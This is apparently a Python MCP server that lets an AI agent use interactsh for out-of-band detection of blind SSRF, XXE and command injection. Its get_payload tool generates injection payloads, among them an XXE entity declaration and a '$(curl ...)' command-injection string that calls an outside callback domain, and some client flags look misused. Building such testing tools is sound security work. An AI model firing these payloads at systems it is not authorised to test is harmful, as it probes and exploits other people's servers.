#!/usr/bin/env python3
"""
Interactsh MCP Server — Real FastMCP server for OOB (Out-of-Band) interaction.
Provides tools for blind SSRF, blind XXE, blind command injection testing.
"""

from __future__ import annotations

import hashlib
import json
import logging
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

from mcp.server import MCPServer

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stderr)],
)
logger = logging.getLogger("interactsh-mcp")

INTERACTSH = shutil.which("interactsh-client") or str(Path.home() / "go" / "bin" / "interactsh-client")
DATA_DIR = Path.home() / ".config" / "interactsh"
DATA_DIR.mkdir(parents=True, exist_ok=True)


def _run(cmd, timeout=30):
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return -1, "", f"{cmd[0]} not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timed out"
    except Exception as exc:
        return -1, "", str(exc)


server = MCPServer(
    "interactsh",
    version="2026.1",
    description="OOB interaction server — blind SSRF, XXE, command injection callback detection",
    instructions="You are an OOB interaction assistant. Use the available tools to generate callback URLs and detect out-of-band interactions for blind vulnerability testing.",
)


_sessions = {}


@server.tool()
def generate_url(count: int = 1) -> dict:
    """Generate interactsh callback URLs for OOB testing.
    
    Args:
        count: Number of URLs to generate
    """
    if not INTERACTSH or not Path(INTERACTSH).exists():
        return {
            "error": "interactsh-client not installed",
            "hint": "Install from https://github.com/projectdiscovery/interactsh",
            "fallback_urls": [f"http://{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.interact.sh" for _ in range(count)],
        }
    
    urls = []
    for _ in range(count):
        rc, stdout, _ = _run([INTERACTSH, "-dns-only"], timeout=15)
        if rc == 0 and stdout:
            for line in stdout.strip().split("\n"):
                if "." in line and not line.startswith("#"):
                    urls.append(line.strip())
    
    return {
        "urls": urls,
        "count": len(urls),
        "note": "Use these URLs in SSRF/XXE payloads to detect OOB interactions",
    }


@server.tool()
def check_interactions(session_id: str = None) -> dict:
    """Check for any received OOB interactions."""
    if not INTERACTSH or not Path(INTERACTSH).exists():
        return {"error": "interactsh-client not installed", "interactions": []}
    
    rc, stdout, stderr = _run([INTERACTSH, "-history"], timeout=15)
    
    interactions = []
    if rc == 0 and stdout:
        for line in stdout.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                interactions.append(line)
    
    return {
        "total_interactions": len(interactions),
        "interactions": interactions,
    }


@server.tool()
def get_payload(protocol: str = "http", custom_domain: str = None) -> dict:
    """Generate an OOB payload for a specific protocol.
    
    Args:
        protocol: Protocol to use (http, dns, smtp, ldap)
        custom_domain: Custom domain to use instead of interactsh
    """
    domain = custom_domain or "interact.sh"
    
    payloads = {
        "http": f"https://{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain}/callback",
        "dns": f"{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain}",
        "xxe": f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain}'>]>",
        "ssrf": f"http://{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain}/ssrf",
        "command_injection": f"$(curl http://{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain})",
        "ldap": f"ldap://{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain}/dc=test",
    }
    
    return {
        "protocol": protocol,
        "payload": payloads.get(protocol, payloads["http"]),
        "all_payloads": payloads,
    }


@server.tool()
def start_server(port: int = 0) -> dict:
    """Start an interactsh server for self-hosted OOB."""
    if not INTERACTSH or not Path(INTERACTSH).exists():
        return {"error": "interactsh-client not installed"}
    
    cmd = [INTERACTSH, "-server", f"0.0.0.0:{port}"] if port else [INTERACTSH, "-server"]
    
    # Start in background
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return {
            "started": True,
            "pid": proc.pid,
            "note": "Server started in background. Use check_interactions to poll for callbacks.",
        }
    except Exception as exc:
        return {"started": False, "error": str(exc)}


if __name__ == "__main__":
    server.run(transport="stdio")
